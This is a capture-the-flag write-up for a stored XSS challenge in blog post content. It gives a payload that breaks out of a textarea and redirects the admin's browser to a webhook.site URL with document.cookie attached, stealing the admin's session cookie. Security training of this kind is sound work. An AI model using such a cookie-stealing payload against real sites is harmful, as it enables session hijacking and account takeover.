# Challenge `Go on and censor my posts` Writeup

- Vulnerability:
    - XSS attack

- Where:
    - Blogpost creation content

- Impact:
    - Allows to steal remote user's cookie

## Steps to reproduce

In this challenge it is not possible to inject javascript code directly.  However, by looking at the source code, we can see that the input is being rendered as plain text.

First of all we need to create a new random post. Then, when we open the source code, we can see that the content is a `textarea` tag that renders everything we input after clicking on the `Update post` button. We can use this to our advantage by closing the tag and then injecting our payload. So, in the content area we should input `</textarea><script>location='https://webhook.site/<unique-id>/'+document.cookie>;</script>` and then click on the `Update post and send it for admin review` button.

This will then be loaded on the admin's browser and on the webhook site we will see a GET request containing the admin's cookie. We only need to URL decode the cookies to get the flag. The cookies will be after `/SECRET=`.
